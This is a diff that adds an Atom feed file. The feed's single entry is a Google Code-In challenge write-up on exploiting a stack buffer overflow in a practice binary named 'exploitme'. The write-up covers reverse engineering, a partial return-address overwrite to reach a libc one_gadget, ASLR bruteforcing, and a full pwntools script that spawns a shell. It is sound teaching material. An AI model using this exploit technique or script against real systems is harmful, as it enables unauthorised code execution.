@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - google-code-in</title>
+	<link href="/tags/google-code-in/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2019-12-15T00:00:00+00:00</updated>
+	<id>/tags/google-code-in/atom.xml</id>
+	<entry xml:lang="en">
+		<title>GCI - Fedora Project - Exploiting a Buffer Overflow Vulnerability</title>
+		<published>2019-12-15T00:00:00+00:00</published>
+		<updated>2019-12-15T00:00:00+00:00</updated>
+		<link href="/posts/gci-exploiting-a-buffer-overflow-vulnerability/" type="text/html"/>
+		<id>/posts/gci-exploiting-a-buffer-overflow-vulnerability/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;p&gt;We are given a binary to exploit. By running &lt;code&gt;checksec&lt;&#x2F;code&gt; on it, we see that the binary has the following protections:
+[show-line-numbers]: false&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;Canary                        : No
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Partial
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Because the binary has NX, we cannot place executable shell code in a buffer and then jump to it. PIE allows the code 
+section of the binary to be located anywhere in memory. This means that we don&#x27;t know the address of functions within 
+the binary; however, we still know relative offsets.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reverse-engineering&quot;&gt;Reverse Engineering&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;Dump of assembler code for function main:
+   0x0000000000001145 &amp;lt;+0&amp;gt;:     push   rbp                                  # Setup Stack
+   0x0000000000001146 &amp;lt;+1&amp;gt;:     mov    rbp,rsp                              
+   0x0000000000001149 &amp;lt;+4&amp;gt;:     sub    rsp,0x110                            # Allocate 0x110 bytes on stack
+   0x0000000000001150 &amp;lt;+11&amp;gt;:    mov    DWORD PTR [rbp-0x104],edi            # Copies edi into stack offset 0x104
+   0x0000000000001156 &amp;lt;+17&amp;gt;:    mov    QWORD PTR [rbp-0x110],rsi            # Copies rsi into stack offset 0x110
+   0x000000000000115d &amp;lt;+24&amp;gt;:    mov    rax,QWORD PTR [rbp-0x110]            # Copies value of pointer into rax
+   0x0000000000001164 &amp;lt;+31&amp;gt;:    add    rax,0x8                              # Adds size_t
+   0x0000000000001168 &amp;lt;+35&amp;gt;:    mov    rdx,QWORD PTR [rax]                  # Copies the value of the pointer [rax + 8] into rdx
+   0x000000000000116b &amp;lt;+38&amp;gt;:    lea    rax,[rbp-0x100]                      # Loads the address of [rbp - 0x100] into rax
+   0x0000000000001172 &amp;lt;+45&amp;gt;:    mov    rsi,rdx                              # rsi = rdx
+   0x0000000000001175 &amp;lt;+48&amp;gt;:    mov    rdi,rax                              # rdi = rax
+   0x0000000000001178 &amp;lt;+51&amp;gt;:    call   0x1030 &amp;lt;strcpy@plt&amp;gt;                  # Calls strcpy(rsi, rdi) ; strcpy ([rbp - 0x100], argv[1])
+   0x000000000000117d &amp;lt;+56&amp;gt;:    lea    rax,[rbp-0x100]                      # Loads address of [rbp-0x100] into rax
+   0x0000000000001184 &amp;lt;+63&amp;gt;:    mov    rdi,rax                              # rdi = rax
+   0x0000000000001187 &amp;lt;+66&amp;gt;:    call   0x1040 &amp;lt;puts@plt&amp;gt;                    # puts(rdi)
+   0x000000000000118c &amp;lt;+71&amp;gt;:    mov    eax,0x0                              # return 0
+   0x0000000000001191 &amp;lt;+76&amp;gt;:    leave                                       
+   0x0000000000001192 &amp;lt;+77&amp;gt;:    ret                                         
+End of assembler dump.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;We can see that &lt;code&gt;argv[1]&lt;&#x2F;code&gt; is copied into a 0x100 byte buffer on the stack. However, there are no checks on the size of &lt;code&gt;argv[1]&lt;&#x2F;code&gt;. This is plainly a stack overflow vulnerability. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;&#x2F;h2&gt;
+&lt;p&gt;Now that we have an understanding of what the binary does, we can construct a payload to get code execution. Since the canary is not enabled, we can overwrite the return address. However, because of PIE and ASLR, we don&#x27;t have any clear targets to jump to.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;where-do-we-jump&quot;&gt;Where do we jump?&lt;&#x2F;h3&gt;
+&lt;p&gt;The binary is dynamically linked and uses the system libc. We can find targets within the binary, when jumped to, result in a call to &lt;code&gt;execve(&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;, NULL, NULL)&lt;&#x2F;code&gt; and lead to &amp;quot;a shell&amp;quot;.  The tool &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;david942j&#x2F;one_gadget&quot;&gt;one_gadget&lt;&#x2F;a&gt; finds offsets to these one gadgets within a given libc binary. Running &lt;code&gt;one_gadget libc.so.6&lt;&#x2F;code&gt; gives the following output:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;gci-exploiting-a-buffer-overflow-vulnerability&#x2F;5df7042c0898260951d4389c.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;However, we don&#x27;t know the base address that libc is loaded at.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;how&quot;&gt;How?&lt;&#x2F;h3&gt;
+&lt;p&gt;Generally, the libc runtime handles initializes itself before calling &lt;code&gt;main&lt;&#x2F;code&gt;. This means that when &lt;code&gt;main&lt;&#x2F;code&gt; returns, we end up within libc. In fact, in this &lt;a href=&quot;https:&#x2F;&#x2F;asciinema.org&#x2F;a&#x2F;JRs1KT1HQCoDUSDAmW1r6CCcC&quot;&gt;asciinema&lt;&#x2F;a&gt;, we see that &lt;code&gt;main&lt;&#x2F;code&gt; returns to &lt;code&gt;__libc_start_main&lt;&#x2F;code&gt; within libc. &lt;&#x2F;p&gt;
+&lt;p&gt;If we overflow the buffer, we can overwrite this address. We could overwrite the entire return pointer, but what if we only overwrote it partially? This is known as a partial overwrite. Since all functions within libc have the same base address, we can overwrite the lower bytes of the return pointer to jump to any known offset within libc.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;one-small-problem&quot;&gt;One small problem&lt;&#x2F;h3&gt;
+&lt;p&gt;When &lt;code&gt;strcpy&lt;&#x2F;code&gt; is called, it adds a null byte to the end of the destination buffer. If we attempt a partial overwrite, this will result &lt;code&gt;0x00&lt;&#x2F;code&gt; being placed within the return pointer.&lt;&#x2F;p&gt;
+&lt;p&gt;To overcome this, we can bruteforce ASLR by repeatedly running the program until libc is loaded in a position that matches the overwritten return pointer. We need to bruteforce 1.5 bytes (because the one_gadget is &lt;code&gt;4f2c5&lt;&#x2F;code&gt;, we only need to bruteforce the upper half of &lt;code&gt;0x?4&lt;&#x2F;code&gt; and the null byte before it). This means that, on average, we will need to execute the program &lt;code&gt;4096&lt;&#x2F;code&gt; times before successfully reaching a shell.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;full-script&quot;&gt;Full Script&lt;&#x2F;h2&gt;
+&lt;script async id=&quot;asciicast-vaUS0kLREa4r92cFJuaipXW5u&quot; src=&quot;https:&#x2F;&#x2F;asciinema.org&#x2F;a&#x2F;vaUS0kLREa4r92cFJuaipXW5u.js&quot;&gt;&lt;&#x2F;script&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+                r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;process([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;exploitme&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;264 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\xc5\xf2\x04&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])
+                r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;ls&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(r.can_recv())
+                r.interactive()
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;EOFError&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+                &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;pass
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This is a writeup for this &lt;a href=&quot;https:&#x2F;&#x2F;codein.withgoogle.com&#x2F;dashboard&#x2F;task-instances&#x2F;5481487256780800&#x2F;&quot;&gt;Google Code-In task&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+</content>
+	</entry>
+</feed>
